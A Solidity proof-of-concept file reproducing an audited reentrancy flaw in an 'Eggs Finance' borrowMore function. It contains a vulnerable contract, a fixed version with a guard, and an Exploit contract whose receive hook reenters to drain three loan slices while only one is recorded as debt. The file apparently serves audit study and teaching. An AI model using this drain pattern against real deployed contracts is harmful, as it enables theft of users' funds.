// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Eggs Finance — borrowMore sends sonic before Loans[msg.sender] is stored
    (Cantina, February 2025).
    Collateral of 0.1 ether gives a 0.099 ether excess, so one slice needs no
    new eggs. The call{value} reenters twice more while the stored loan is
    still 0. Three slices of 0.099 ether leave the contract, and the recorded
    loan is only one slice. safetyCheck passes because totalBorrowed rises
    with the sonic that left, so the backing price does not fall. */

contract Eggs {
    mapping(address => uint256) public loans;
    mapping(address => uint256) public collateral;
    uint256 public totalBorrowed;
    uint256 public totalSupply = 1 ether;
    uint256 public lastPrice;

    function fund() external payable {}

    function openPosition(address user, uint256 eggs) external {
        require(collateral[user] == 0, "open");
        collateral[user] = eggs;
    }

    function getBacking() public view returns (uint256) {
        return address(this).balance + totalBorrowed;
    }

    function safetyCheck() internal {
        uint256 newPrice = (getBacking() * 1 ether) / totalSupply;
        require(lastPrice <= newPrice, "The price of eggs cannot decrease");
        lastPrice = newPrice;
    }

    function sendSonic(address to, uint256 value) internal {
        (bool ok,) = to.call{value: value}(""); // @> VULN: value call before Loans[msg.sender] is stored
        require(ok, "SONIC Transfer failed.");
    }

    function borrowMore(uint256 sonic) external {
        uint256 userBorrowed = loans[msg.sender];
        uint256 userCollateral = collateral[msg.sender];
        uint256 userEggs = sonic;
        uint256 userBorrowedInEggs = userBorrowed;
        uint256 userExcessInEggs = ((userCollateral) * 99) / 100 - userBorrowedInEggs;
        uint256 requireCollateralFromUser = userEggs;
        if (userExcessInEggs >= userEggs) {
            requireCollateralFromUser = 0;
        } else {
            requireCollateralFromUser = requireCollateralFromUser - userExcessInEggs;
        }
        if (requireCollateralFromUser != 0) {
            collateral[msg.sender] += requireCollateralFromUser;
        }
        totalBorrowed += sonic;
        // @> VULN: sonic is sent before Loans[msg.sender] is updated, so the same excess can be borrowed again
        sendSonic(msg.sender, sonic);
        loans[msg.sender] = userBorrowed + sonic;
        safetyCheck();
    }
}

contract EggsFixed {
    mapping(address => uint256) public loans;
    mapping(address => uint256) public collateral;
    uint256 public totalBorrowed;
    uint256 public totalSupply = 1 ether;
    uint256 public lastPrice;
    bool private entered;

    function fund() external payable {}

    function openPosition(address user, uint256 eggs) external {
        collateral[user] = eggs;
    }

    function borrowMore(uint256 sonic) external {
        require(!entered, "reentered");
        entered = true;
        uint256 userBorrowed = loans[msg.sender];
        uint256 userExcessInEggs = ((collateral[msg.sender]) * 99) / 100 - userBorrowed;
        uint256 requireCollateralFromUser = sonic;
        if (userExcessInEggs >= sonic) requireCollateralFromUser = 0;
        else requireCollateralFromUser -= userExcessInEggs;
        if (requireCollateralFromUser != 0) revert("needs collateral");
        loans[msg.sender] = userBorrowed + sonic;
        totalBorrowed += sonic;
        (bool ok,) = msg.sender.call{value: sonic}("");
        require(ok, "SONIC Transfer failed.");
        uint256 newPrice = ((address(this).balance + totalBorrowed) * 1 ether) / totalSupply;
        require(lastPrice <= newPrice, "The price of eggs cannot decrease");
        lastPrice = newPrice;
        entered = false;
    }
}

contract Exploit {
    Eggs public eggs; // nonce 1
    uint256 public constant SLICE = 0.099 ether;
    uint256 public rounds;
    uint256 public received;

    constructor() {
        eggs = new Eggs();
        eggs.openPosition(address(this), 0.1 ether);
    }

    receive() external payable {
        if (msg.sender == address(eggs) && rounds < 2) {
            rounds += 1;
            eggs.borrowMore(SLICE);
        }
    }

    function run() external {
        require(address(eggs).balance == SLICE * 3, "pool seeded");
        eggs.borrowMore(SLICE);
        received = address(this).balance;
        require(received == SLICE * 3, "drained 0.297 ether");
        require(address(eggs).balance == 0, "pool empty");
        require(eggs.loans(address(this)) == SLICE, "debt is one slice");
        require(eggs.totalBorrowed() == SLICE * 3, "accounting counts three");
        require(rounds == 2, "two reentries");
        require(eggs.lastPrice() > 0, "price check passed");
    }
}
